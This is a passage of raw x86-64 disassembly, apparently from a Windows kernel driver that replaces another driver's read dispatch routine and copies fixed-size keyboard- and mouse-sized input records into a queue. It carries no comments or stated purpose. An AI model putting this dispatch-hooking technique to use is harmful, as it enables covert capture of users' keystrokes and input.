   140001751:	33 d2                	xor    %edx,%edx
   140001753:	ff 15 27 39 00 00    	call   *0x3927(%rip)        # 0x140005080
   140001759:	48 83 ef 01          	sub    $0x1,%rdi
   14000175d:	0f 85 4d ff ff ff    	jne    0x1400016b0
   140001763:	e9 cd 00 00 00       	jmp    0x140001835
   140001768:	83 ff 01             	cmp    $0x1,%edi
   14000176b:	0f 85 c4 00 00 00    	jne    0x140001835
   140001771:	48 b8 ab aa aa aa aa 	movabs $0xaaaaaaaaaaaaaaab,%rax
   140001778:	aa aa aa 
   14000177b:	49 f7 64 24 38       	mulq   0x38(%r12)
   140001780:	48 c1 ea 04          	shr    $0x4,%rdx
   140001784:	85 d2                	test   %edx,%edx
   140001786:	0f 84 a9 00 00 00    	je     0x140001835
   14000178c:	8b fa                	mov    %edx,%edi
   14000178e:	66 90                	xchg   %ax,%ax
   140001790:	ff 05 7e 4c 00 00    	incl   0x4c7e(%rip)        # 0x140006414
   140001796:	48 8d 0d 63 4c 00 00 	lea    0x4c63(%rip),%rcx        # 0x140006400
   14000179d:	ff 15 cd 38 00 00    	call   *0x38cd(%rip)        # 0x140005070
   1400017a3:	48 8b d0             	mov    %rax,%rdx
   1400017a6:	48 85 c0             	test   %rax,%rax
   1400017a9:	75 27                	jne    0x1400017d2
   1400017ab:	8b 15 7b 4c 00 00    	mov    0x4c7b(%rip),%edx        # 0x14000642c
   1400017b1:	44 8b 05 70 4c 00 00 	mov    0x4c70(%rip),%r8d        # 0x140006428
   1400017b8:	8b 0d 66 4c 00 00    	mov    0x4c66(%rip),%ecx        # 0x140006424
   1400017be:	ff 05 54 4c 00 00    	incl   0x4c54(%rip)        # 0x140006418
   1400017c4:	ff 15 66 4c 00 00    	call   *0x4c66(%rip)        # 0x140006430
   1400017ca:	48 8b d0             	mov    %rax,%rdx
   1400017cd:	48 85 c0             	test   %rax,%rax
   1400017d0:	74 59                	je     0x14000182b
   1400017d2:	c7 42 10 01 00 00 00 	movl   $0x1,0x10(%rdx)
   1400017d9:	4c 89 6a 18          	mov    %r13,0x18(%rdx)
   1400017dd:	8b 45 00             	mov    0x0(%rbp),%eax
   1400017e0:	89 42 2c             	mov    %eax,0x2c(%rdx)
   1400017e3:	8b 45 04             	mov    0x4(%rbp),%eax
   1400017e6:	4c 8d 05 e3 4b 00 00 	lea    0x4be3(%rip),%r8        # 0x1400063d0
   1400017ed:	89 42 30             	mov    %eax,0x30(%rdx)
   1400017f0:	8b 45 08             	mov    0x8(%rbp),%eax
   1400017f3:	48 8d 0d c6 4b 00 00 	lea    0x4bc6(%rip),%rcx        # 0x1400063c0
   1400017fa:	89 42 34             	mov    %eax,0x34(%rdx)
   1400017fd:	8b 45 0c             	mov    0xc(%rbp),%eax
   140001800:	89 42 38             	mov    %eax,0x38(%rdx)
   140001803:	8b 45 10             	mov    0x10(%rbp),%eax
   140001806:	89 42 3c             	mov    %eax,0x3c(%rdx)
   140001809:	8b 45 14             	mov    0x14(%rbp),%eax
   14000180c:	89 42 40             	mov    %eax,0x40(%rdx)
   14000180f:	ff 15 63 38 00 00    	call   *0x3863(%rip)        # 0x140005078
   140001815:	45 33 c9             	xor    %r9d,%r9d
   140001818:	48 8d 0d b9 4b 00 00 	lea    0x4bb9(%rip),%rcx        # 0x1400063d8
   14000181f:	45 8d 41 01          	lea    0x1(%r9),%r8d
   140001823:	33 d2                	xor    %edx,%edx
   140001825:	ff 15 55 38 00 00    	call   *0x3855(%rip)        # 0x140005080
   14000182b:	48 83 ef 01          	sub    $0x1,%rdi
   14000182f:	0f 85 5b ff ff ff    	jne    0x140001790
   140001835:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   14000183a:	48 8b 43 28          	mov    0x28(%rbx),%rax
   14000183e:	48 85 c0             	test   %rax,%rax
   140001841:	74 32                	je     0x140001875
   140001843:	85 f6                	test   %esi,%esi
   140001845:	78 06                	js     0x14000184d
   140001847:	f6 43 20 40          	testb  $0x40,0x20(%rbx)
   14000184b:	75 1a                	jne    0x140001867
   14000184d:	81 fe 20 01 00 c0    	cmp    $0xc0000120,%esi
   140001853:	75 08                	jne    0x14000185d
   140001855:	f6 43 20 20          	testb  $0x20,0x20(%rbx)
   140001859:	75 0c                	jne    0x140001867
   14000185b:	eb 18                	jmp    0x140001875
   14000185d:	85 f6                	test   %esi,%esi
   14000185f:	79 14                	jns    0x140001875
   140001861:	f6 43 20 80          	testb  $0x80,0x20(%rbx)
   140001865:	74 0e                	je     0x140001875
   140001867:	4c 8b 43 18          	mov    0x18(%rbx),%r8
   14000186b:	49 8b d4             	mov    %r12,%rdx
   14000186e:	49 8b cd             	mov    %r13,%rcx
   140001871:	ff d0                	call   *%rax
   140001873:	8b f0                	mov    %eax,%esi
   140001875:	ff 05 21 4c 00 00    	incl   0x4c21(%rip)        # 0x14000649c
   14000187b:	48 8d 0d fe 4b 00 00 	lea    0x4bfe(%rip),%rcx        # 0x140006480
   140001882:	ff 15 08 38 00 00    	call   *0x3808(%rip)        # 0x140005090
   140001888:	66 3b 05 01 4c 00 00 	cmp    0x4c01(%rip),%ax        # 0x140006490
   14000188f:	72 11                	jb     0x1400018a2
   140001891:	ff 05 09 4c 00 00    	incl   0x4c09(%rip)        # 0x1400064a0
   140001897:	48 8b cb             	mov    %rbx,%rcx
   14000189a:	ff 15 18 4c 00 00    	call   *0x4c18(%rip)        # 0x1400064b8
   1400018a0:	eb 10                	jmp    0x1400018b2
   1400018a2:	48 8d 0d d7 4b 00 00 	lea    0x4bd7(%rip),%rcx        # 0x140006480
   1400018a9:	48 8b d3             	mov    %rbx,%rdx
   1400018ac:	ff 15 d6 37 00 00    	call   *0x37d6(%rip)        # 0x140005088
   1400018b2:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   1400018b7:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   1400018bc:	8b c6                	mov    %esi,%eax
   1400018be:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   1400018c3:	48 83 c4 20          	add    $0x20,%rsp
   1400018c7:	41 5e                	pop    %r14
   1400018c9:	41 5d                	pop    %r13
   1400018cb:	41 5c                	pop    %r12
   1400018cd:	c3                   	ret
   1400018ce:	cc                   	int3
   1400018cf:	cc                   	int3
   1400018d0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400018d5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400018da:	57                   	push   %rdi
   1400018db:	48 83 ec 20          	sub    $0x20,%rsp
   1400018df:	48 8b ba b8 00 00 00 	mov    0xb8(%rdx),%rdi
   1400018e6:	48 8b da             	mov    %rdx,%rbx
   1400018e9:	48 8b f1             	mov    %rcx,%rsi
   1400018ec:	8b 47 08             	mov    0x8(%rdi),%eax
   1400018ef:	85 c0                	test   %eax,%eax
   1400018f1:	74 25                	je     0x140001918
   1400018f3:	4c 8b c0             	mov    %rax,%r8
   1400018f6:	48 b8 ab aa aa aa aa 	movabs $0xaaaaaaaaaaaaaaab,%rax
   1400018fd:	aa aa aa 
   140001900:	49 f7 e0             	mul    %r8
   140001903:	48 c1 ea 03          	shr    $0x3,%rdx
   140001907:	48 8d 04 52          	lea    (%rdx,%rdx,2),%rax
   14000190b:	48 c1 e0 02          	shl    $0x2,%rax
   14000190f:	4c 3b c0             	cmp    %rax,%r8
   140001912:	0f 85 a6 00 00 00    	jne    0x1400019be
   140001918:	f6 43 10 43          	testb  $0x43,0x10(%rbx)
   14000191c:	0f 84 9c 00 00 00    	je     0x1400019be
   140001922:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140001927:	48 8d 2d b2 fc ff ff 	lea    -0x34e(%rip),%rbp        # 0x1400015e0
   14000192e:	48 39 6f 38          	cmp    %rbp,0x38(%rdi)
   140001932:	0f 84 81 00 00 00    	je     0x1400019b9
   140001938:	ff 05 56 4b 00 00    	incl   0x4b56(%rip)        # 0x140006494
   14000193e:	48 8d 0d 3b 4b 00 00 	lea    0x4b3b(%rip),%rcx        # 0x140006480
   140001945:	ff 15 25 37 00 00    	call   *0x3725(%rip)        # 0x140005070
   14000194b:	48 8b d0             	mov    %rax,%rdx
   14000194e:	48 85 c0             	test   %rax,%rax
   140001951:	75 27                	jne    0x14000197a
   140001953:	8b 15 53 4b 00 00    	mov    0x4b53(%rip),%edx        # 0x1400064ac
   140001959:	44 8b 05 48 4b 00 00 	mov    0x4b48(%rip),%r8d        # 0x1400064a8
   140001960:	8b 0d 3e 4b 00 00    	mov    0x4b3e(%rip),%ecx        # 0x1400064a4
   140001966:	ff 05 2c 4b 00 00    	incl   0x4b2c(%rip)        # 0x140006498
   14000196c:	ff 15 3e 4b 00 00    	call   *0x4b3e(%rip)        # 0x1400064b0
   140001972:	48 8b d0             	mov    %rax,%rdx
   140001975:	48 85 c0             	test   %rax,%rax
   140001978:	74 3f                	je     0x1400019b9
   14000197a:	48 8b 47 38          	mov    0x38(%rdi),%rax
   14000197e:	48 89 72 10          	mov    %rsi,0x10(%rdx)
   140001982:	4c 8d 05 97 4b 00 00 	lea    0x4b97(%rip),%r8        # 0x140006520
   140001989:	48 89 42 28          	mov    %rax,0x28(%rdx)
   14000198d:	48 8b 47 40          	mov    0x40(%rdi),%rax
   140001991:	48 8d 0d 78 4b 00 00 	lea    0x4b78(%rip),%rcx        # 0x140006510
   140001998:	48 89 42 18          	mov    %rax,0x18(%rdx)
   14000199c:	0f b6 47 03          	movzbl 0x3(%rdi),%eax
   1400019a0:	88 42 20             	mov    %al,0x20(%rdx)
   1400019a3:	ff 15 cf 36 00 00    	call   *0x36cf(%rip)        # 0x140005078
   1400019a9:	80 4f 03 e0          	orb    $0xe0,0x3(%rdi)
   1400019ad:	48 89 6f 38          	mov    %rbp,0x38(%rdi)
   1400019b1:	48 c7 47 40 02 00 00 	movq   $0x2,0x40(%rdi)
   1400019b8:	00 
   1400019b9:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   1400019be:	48 8b d3             	mov    %rbx,%rdx
   1400019c1:	48 8b ce             	mov    %rsi,%rcx
   1400019c4:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1400019c9:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400019ce:	48 83 c4 20          	add    $0x20,%rsp
   1400019d2:	5f                   	pop    %rdi
   1400019d3:	48 ff 25 56 4b 00 00 	rex.W jmp *0x4b56(%rip)        # 0x140006530
   1400019da:	cc                   	int3
   1400019db:	cc                   	int3
   1400019dc:	cc                   	int3
   1400019dd:	cc                   	int3
   1400019de:	cc                   	int3
   1400019df:	cc                   	int3
   1400019e0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400019e5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400019ea:	57                   	push   %rdi
   1400019eb:	48 83 ec 20          	sub    $0x20,%rsp
   1400019ef:	48 8b ba b8 00 00 00 	mov    0xb8(%rdx),%rdi
   1400019f6:	48 8b da             	mov    %rdx,%rbx
   1400019f9:	48 8b f1             	mov    %rcx,%rsi
   1400019fc:	8b 47 08             	mov    0x8(%rdi),%eax
   1400019ff:	85 c0                	test   %eax,%eax
   140001a01:	74 25                	je     0x140001a28
   140001a03:	4c 8b c0             	mov    %rax,%r8
   140001a06:	48 b8 ab aa aa aa aa 	movabs $0xaaaaaaaaaaaaaaab,%rax
   140001a0d:	aa aa aa 
   140001a10:	49 f7 e0             	mul    %r8
   140001a13:	48 c1 ea 04          	shr    $0x4,%rdx
   140001a17:	48 8d 04 52          	lea    (%rdx,%rdx,2),%rax
   140001a1b:	48 c1 e0 03          	shl    $0x3,%rax
   140001a1f:	4c 3b c0             	cmp    %rax,%r8
   140001a22:	0f 85 a6 00 00 00    	jne    0x140001ace
   140001a28:	f6 43 10 43          	testb  $0x43,0x10(%rbx)
   140001a2c:	0f 84 9c 00 00 00    	je     0x140001ace
   140001a32:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140001a37:	48 8d 2d a2 fb ff ff 	lea    -0x45e(%rip),%rbp        # 0x1400015e0
   140001a3e:	48 39 6f 38          	cmp    %rbp,0x38(%rdi)
   140001a42:	0f 84 81 00 00 00    	je     0x140001ac9
   140001a48:	ff 05 46 4a 00 00    	incl   0x4a46(%rip)        # 0x140006494
   140001a4e:	48 8d 0d 2b 4a 00 00 	lea    0x4a2b(%rip),%rcx        # 0x140006480
   140001a55:	ff 15 15 36 00 00    	call   *0x3615(%rip)        # 0x140005070
   140001a5b:	48 8b d0             	mov    %rax,%rdx
   140001a5e:	48 85 c0             	test   %rax,%rax
   140001a61:	75 27                	jne    0x140001a8a
   140001a63:	8b 15 43 4a 00 00    	mov    0x4a43(%rip),%edx        # 0x1400064ac
   140001a69:	44 8b 05 38 4a 00 00 	mov    0x4a38(%rip),%r8d        # 0x1400064a8
   140001a70:	8b 0d 2e 4a 00 00    	mov    0x4a2e(%rip),%ecx        # 0x1400064a4
   140001a76:	ff 05 1c 4a 00 00    	incl   0x4a1c(%rip)        # 0x140006498
   140001a7c:	ff 15 2e 4a 00 00    	call   *0x4a2e(%rip)        # 0x1400064b0
   140001a82:	48 8b d0             	mov    %rax,%rdx
   140001a85:	48 85 c0             	test   %rax,%rax
   140001a88:	74 3f                	je     0x140001ac9
   140001a8a:	48 8b 47 38          	mov    0x38(%rdi),%rax
   140001a8e:	48 89 72 10          	mov    %rsi,0x10(%rdx)
   140001a92:	4c 8d 05 5f 49 00 00 	lea    0x495f(%rip),%r8        # 0x1400063f8
   140001a99:	48 89 42 28          	mov    %rax,0x28(%rdx)
   140001a9d:	48 8b 47 40          	mov    0x40(%rdi),%rax
   140001aa1:	48 8d 0d 58 4a 00 00 	lea    0x4a58(%rip),%rcx        # 0x140006500
   140001aa8:	48 89 42 18          	mov    %rax,0x18(%rdx)
   140001aac:	0f b6 47 03          	movzbl 0x3(%rdi),%eax
   140001ab0:	88 42 20             	mov    %al,0x20(%rdx)
   140001ab3:	ff 15 bf 35 00 00    	call   *0x35bf(%rip)        # 0x140005078
   140001ab9:	80 4f 03 e0          	orb    $0xe0,0x3(%rdi)
   140001abd:	48 89 6f 38          	mov    %rbp,0x38(%rdi)
   140001ac1:	48 c7 47 40 01 00 00 	movq   $0x1,0x40(%rdi)
   140001ac8:	00 
   140001ac9:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   140001ace:	48 8b d3             	mov    %rbx,%rdx
   140001ad1:	48 8b ce             	mov    %rsi,%rcx
   140001ad4:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140001ad9:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140001ade:	48 83 c4 20          	add    $0x20,%rsp
   140001ae2:	5f                   	pop    %rdi
   140001ae3:	48 ff 25 56 4a 00 00 	rex.W jmp *0x4a56(%rip)        # 0x140006540
   140001aea:	cc                   	int3
   140001aeb:	cc                   	int3
   140001aec:	cc                   	int3
   140001aed:	cc                   	int3
   140001aee:	cc                   	int3
   140001aef:	cc                   	int3
   140001af0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001af5:	57                   	push   %rdi
   140001af6:	48 83 ec 30          	sub    $0x30,%rsp
   140001afa:	33 ff                	xor    %edi,%edi
   140001afc:	0f 1f 40 00          	nopl   0x0(%rax)
   140001b00:	48 8d 0d d1 48 00 00 	lea    0x48d1(%rip),%rcx        # 0x1400063d8
   140001b07:	45 33 c9             	xor    %r9d,%r9d
   140001b0a:	45 33 c0             	xor    %r8d,%r8d
   140001b0d:	33 d2                	xor    %edx,%edx
   140001b0f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001b14:	ff 15 3e 35 00 00    	call   *0x353e(%rip)        # 0x140005058
   140001b1a:	48 8d 15 af 48 00 00 	lea    0x48af(%rip),%rdx        # 0x1400063d0
   140001b21:	48 8d 0d 98 48 00 00 	lea    0x4898(%rip),%rcx        # 0x1400063c0
   140001b28:	ff 15 32 35 00 00    	call   *0x3532(%rip)        # 0x140005060
   140001b2e:	48 8b d8             	mov    %rax,%rbx
   140001b31:	8b 40 10             	mov    0x10(%rax),%eax
   140001b34:	83 f8 02             	cmp    $0x2,%eax
   140001b37:	75 18                	jne    0x140001b51
   140001b39:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140001b3d:	e8 ae f9 ff ff       	call   0x1400014f0
   140001b42:	0f b7 53 24          	movzwl 0x24(%rbx),%edx
   140001b46:	0f b7 4b 22          	movzwl 0x22(%rbx),%ecx
   140001b4a:	e8 61 f7 ff ff       	call   0x1400012b0
   140001b4f:	eb 3b                	jmp    0x140001b8c
   140001b51:	83 f8 01             	cmp    $0x1,%eax
   140001b54:	75 36                	jne    0x140001b8c
   140001b56:	f6 43 30 02          	testb  $0x2,0x30(%rbx)
   140001b5a:	74 0c                	je     0x140001b68
   140001b5c:	48 8d 0d 39 37 00 00 	lea    0x3739(%rip),%rcx        # 0x14000529c
   140001b63:	e8 88 f5 ff ff       	call   0x1400010f0
   140001b68:	f6 43 30 08          	testb  $0x8,0x30(%rbx)
   140001b6c:	74 0c                	je     0x140001b7a
   140001b6e:	48 8d 0d 2f 37 00 00 	lea    0x372f(%rip),%rcx        # 0x1400052a4
   140001b75:	e8 76 f5 ff ff       	call   0x1400010f0
   140001b7a:	f6 43 30 20          	testb  $0x20,0x30(%rbx)
   140001b7e:	74 0c                	je     0x140001b8c
   140001b80:	48 8d 0d 25 37 00 00 	lea    0x3725(%rip),%rcx        # 0x1400052ac
   140001b87:	e8 64 f5 ff ff       	call   0x1400010f0
   140001b8c:	ff 05 8a 48 00 00    	incl   0x488a(%rip)        # 0x14000641c
   140001b92:	48 8d 0d 67 48 00 00 	lea    0x4867(%rip),%rcx        # 0x140006400
   140001b99:	ff 15 f1 34 00 00    	call   *0x34f1(%rip)        # 0x140005090
   140001b9f:	66 3b 05 6a 48 00 00 	cmp    0x486a(%rip),%ax        # 0x140006410
   140001ba6:	72 14                	jb     0x140001bbc
   140001ba8:	ff 05 72 48 00 00    	incl   0x4872(%rip)        # 0x140006420
   140001bae:	48 8b cb             	mov    %rbx,%rcx
   140001bb1:	ff 15 81 48 00 00    	call   *0x4881(%rip)        # 0x140006438
   140001bb7:	e9 44 ff ff ff       	jmp    0x140001b00
   140001bbc:	48 8d 0d 3d 48 00 00 	lea    0x483d(%rip),%rcx        # 0x140006400
   140001bc3:	48 8b d3             	mov    %rbx,%rdx
   140001bc6:	ff 15 bc 34 00 00    	call   *0x34bc(%rip)        # 0x140005088
   140001bcc:	e9 2f ff ff ff       	jmp    0x140001b00
   140001bd1:	cc                   	int3
   140001bd2:	cc                   	int3
   140001bd3:	cc                   	int3
   140001bd4:	cc                   	int3
   140001bd5:	cc                   	int3
   140001bd6:	cc                   	int3
   140001bd7:	cc                   	int3
   140001bd8:	cc                   	int3
   140001bd9:	cc                   	int3
   140001bda:	cc                   	int3
   140001bdb:	cc                   	int3
   140001bdc:	cc                   	int3
   140001bdd:	cc                   	int3
   140001bde:	cc                   	int3
   140001bdf:	cc                   	int3
   140001be0:	40 53                	rex push %rbx
   140001be2:	48 83 ec 50          	sub    $0x50,%rsp
   140001be6:	48 8d 15 cb 36 00 00 	lea    0x36cb(%rip),%rdx        # 0x1400052b8
   140001bed:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001bf2:	ff 15 08 34 00 00    	call   *0x3408(%rip)        # 0x140005000
   140001bf8:	48 8b 05 a9 34 00 00 	mov    0x34a9(%rip),%rax        # 0x1400050a8
   140001bff:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   140001c04:	48 8b 08             	mov    (%rax),%rcx
   140001c07:	4c 89 5c 24 38       	mov    %r11,0x38(%rsp)
   140001c0c:	45 33 c9             	xor    %r9d,%r9d
   140001c0f:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140001c16:	00 00 
   140001c18:	c6 44 24 28 00       	movb   $0x0,0x28(%rsp)
   140001c1d:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140001c22:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001c27:	41 8d 51 40          	lea    0x40(%r9),%edx
   140001c2b:	45 33 c0             	xor    %r8d,%r8d
   140001c2e:	ff 15 6c 34 00 00    	call   *0x346c(%rip)        # 0x1400050a0
   140001c34:	8b d8                	mov    %eax,%ebx
   140001c36:	85 c0                	test   %eax,%eax
   140001c38:	78 34                	js     0x140001c6e
   140001c3a:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140001c3f:	48 8b 8a 88 00 00 00 	mov    0x88(%rdx),%rcx
   140001c46:	48 89 0d e3 48 00 00 	mov    %rcx,0x48e3(%rip)        # 0x140006530
   140001c4d:	48 8d 0d 7c fc ff ff 	lea    -0x384(%rip),%rcx        # 0x1400018d0
   140001c54:	48 87 8a 88 00 00 00 	xchg   %rcx,0x88(%rdx)
   140001c5b:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140001c60:	ff 15 4a 34 00 00    	call   *0x344a(%rip)        # 0x1400050b0
   140001c66:	8b c3                	mov    %ebx,%eax
   140001c68:	48 83 c4 50          	add    $0x50,%rsp
   140001c6c:	5b                   	pop    %rbx
   140001c6d:	c3                   	ret
   140001c6e:	48 8d 15 6b 36 00 00 	lea    0x366b(%rip),%rdx        # 0x1400052e0
   140001c75:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001c7a:	ff 15 80 33 00 00    	call   *0x3380(%rip)        # 0x140005000
   140001c80:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140001c85:	4c 8d 44 24 68       	lea    0x68(%rsp),%r8
   140001c8a:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001c8f:	ba ff 01 1f 00       	mov    $0x1f01ff,%edx
   140001c94:	ff 15 1e 34 00 00    	call   *0x341e(%rip)        # 0x1400050b8
   140001c9a:	8b d8                	mov    %eax,%ebx
   140001c9c:	85 c0                	test   %eax,%eax
   140001c9e:	78 47                	js     0x140001ce7
   140001ca0:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140001ca5:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   140001ca9:	4c 8b 42 08          	mov    0x8(%rdx),%r8
   140001cad:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
   140001cb2:	49 8b 88 88 00 00 00 	mov    0x88(%r8),%rcx
   140001cb9:	48 89 0d 70 48 00 00 	mov    %rcx,0x4870(%rip)        # 0x140006530
   140001cc0:	48 8d 0d 09 fc ff ff 	lea    -0x3f7(%rip),%rcx        # 0x1400018d0
   140001cc7:	49 87 88 88 00 00 00 	xchg   %rcx,0x88(%r8)
   140001cce:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140001cd3:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140001cd8:	48 89 05 59 48 00 00 	mov    %rax,0x4859(%rip)        # 0x140006538
   140001cdf:	ff 15 cb 33 00 00    	call   *0x33cb(%rip)        # 0x1400050b0
   140001ce5:	8b c3                	mov    %ebx,%eax
   140001ce7:	48 83 c4 50          	add    $0x50,%rsp
   140001ceb:	5b                   	pop    %rbx
   140001cec:	c3                   	ret
   140001ced:	cc                   	int3
   140001cee:	cc                   	int3
   140001cef:	cc                   	int3
   140001cf0:	40 53                	rex push %rbx
   140001cf2:	48 83 ec 50          	sub    $0x50,%rsp
   140001cf6:	48 8d 15 13 36 00 00 	lea    0x3613(%rip),%rdx        # 0x140005310
   140001cfd:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001d02:	ff 15 f8 32 00 00    	call   *0x32f8(%rip)        # 0x140005000
   140001d08:	48 8b 05 99 33 00 00 	mov    0x3399(%rip),%rax        # 0x1400050a8
   140001d0f:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   140001d14:	48 8b 08             	mov    (%rax),%rcx
   140001d17:	4c 89 5c 24 38       	mov    %r11,0x38(%rsp)
   140001d1c:	45 33 c9             	xor    %r9d,%r9d
   140001d1f:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140001d26:	00 00 
   140001d28:	c6 44 24 28 00       	movb   $0x0,0x28(%rsp)
   140001d2d:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140001d32:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001d37:	41 8d 51 40          	lea    0x40(%r9),%edx
   140001d3b:	45 33 c0             	xor    %r8d,%r8d
   140001d3e:	ff 15 5c 33 00 00    	call   *0x335c(%rip)        # 0x1400050a0
   140001d44:	8b d8                	mov    %eax,%ebx
   140001d46:	85 c0                	test   %eax,%eax
   140001d48:	78 3b                	js     0x140001d85
   140001d4a:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140001d4f:	48 8b 8a 88 00 00 00 	mov    0x88(%rdx),%rcx
   140001d56:	48 89 0d e3 47 00 00 	mov    %rcx,0x47e3(%rip)        # 0x140006540
   140001d5d:	48 8d 0d 7c fc ff ff 	lea    -0x384(%rip),%rcx        # 0x1400019e0
   140001d64:	48 87 8a 88 00 00 00 	xchg   %rcx,0x88(%rdx)
   140001d6b:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140001d70:	48 89 0d d1 47 00 00 	mov    %rcx,0x47d1(%rip)        # 0x140006548
   140001d77:	ff 15 33 33 00 00    	call   *0x3333(%rip)        # 0x1400050b0
   140001d7d:	8b c3                	mov    %ebx,%eax
   140001d7f:	48 83 c4 50          	add    $0x50,%rsp
   140001d83:	5b                   	pop    %rbx
   140001d84:	c3                   	ret
   140001d85:	48 8d 15 ac 35 00 00 	lea    0x35ac(%rip),%rdx        # 0x140005338
   140001d8c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001d91:	ff 15 69 32 00 00    	call   *0x3269(%rip)        # 0x140005000
   140001d97:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140001d9c:	4c 8d 44 24 68       	lea    0x68(%rsp),%r8
   140001da1:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001da6:	ba ff 01 1f 00       	mov    $0x1f01ff,%edx
   140001dab:	ff 15 07 33 00 00    	call   *0x3307(%rip)        # 0x1400050b8
   140001db1:	8b d8                	mov    %eax,%ebx
   140001db3:	85 c0                	test   %eax,%eax
   140001db5:	78 47                	js     0x140001dfe
   140001db7:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140001dbc:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   140001dc0:	4c 8b 42 08          	mov    0x8(%rdx),%r8
   140001dc4:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
   140001dc9:	49 8b 88 88 00 00 00 	mov    0x88(%r8),%rcx
   140001dd0:	48 89 0d 69 47 00 00 	mov    %rcx,0x4769(%rip)        # 0x140006540
   140001dd7:	48 8d 0d 02 fc ff ff 	lea    -0x3fe(%rip),%rcx        # 0x1400019e0
   140001dde:	49 87 88 88 00 00 00 	xchg   %rcx,0x88(%r8)
   140001de5:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140001dea:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140001def:	48 89 05 52 47 00 00 	mov    %rax,0x4752(%rip)        # 0x140006548
   140001df6:	ff 15 b4 32 00 00    	call   *0x32b4(%rip)        # 0x1400050b0
   140001dfc:	8b c3                	mov    %ebx,%eax
   140001dfe:	48 83 c4 50          	add    $0x50,%rsp
   140001e02:	5b                   	pop    %rbx
   140001e03:	c3                   	ret
   140001e04:	cc                   	int3
   140001e05:	cc                   	int3
   140001e06:	cc                   	int3
   140001e07:	cc                   	int3
   140001e08:	cc                   	int3
   140001e09:	cc                   	int3
   140001e0a:	cc                   	int3
   140001e0b:	cc                   	int3
   140001e0c:	cc                   	int3
   140001e0d:	cc                   	int3
   140001e0e:	cc                   	int3
   140001e0f:	cc                   	int3
   140001e10:	40 53                	rex push %rbx
   140001e12:	48 83 ec 40          	sub    $0x40,%rsp
   140001e16:	48 8d 05 f3 46 00 00 	lea    0x46f3(%rip),%rax        # 0x140006510
   140001e1d:	33 db                	xor    %ebx,%ebx
   140001e1f:	48 8d 0d 5a 46 00 00 	lea    0x465a(%rip),%rcx        # 0x140006480
   140001e26:	48 89 05 eb 46 00 00 	mov    %rax,0x46eb(%rip)        # 0x140006518
   140001e2d:	48 89 05 dc 46 00 00 	mov    %rax,0x46dc(%rip)        # 0x140006510
   140001e34:	48 8d 05 c5 46 00 00 	lea    0x46c5(%rip),%rax        # 0x140006500
   140001e3b:	66 89 5c 24 30       	mov    %bx,0x30(%rsp)
   140001e40:	45 33 c9             	xor    %r9d,%r9d
   140001e43:	45 33 c0             	xor    %r8d,%r8d
   140001e46:	33 d2                	xor    %edx,%edx
   140001e48:	c7 44 24 28 6d 6b 67 	movl   $0x70676b6d,0x28(%rsp)
   140001e4f:	70 
   140001e50:	48 89 05 b1 46 00 00 	mov    %rax,0x46b1(%rip)        # 0x140006508
   140001e57:	48 89 05 a2 46 00 00 	mov    %rax,0x46a2(%rip)        # 0x140006500
   140001e5e:	48 89 1d bb 46 00 00 	mov    %rbx,0x46bb(%rip)        # 0x140006520
   140001e65:	48 89 1d 8c 45 00 00 	mov    %rbx,0x458c(%rip)        # 0x1400063f8
   140001e6c:	48 c7 44 24 20 30 00 	movq   $0x30,0x20(%rsp)
   140001e73:	00 00 
   140001e75:	ff 15 45 32 00 00    	call   *0x3245(%rip)        # 0x1400050c0
   140001e7b:	48 8d 0d 56 45 00 00 	lea    0x4556(%rip),%rcx        # 0x1400063d8
   140001e82:	33 d2                	xor    %edx,%edx
   140001e84:	41 b8 ff ff ff 7f    	mov    $0x7fffffff,%r8d
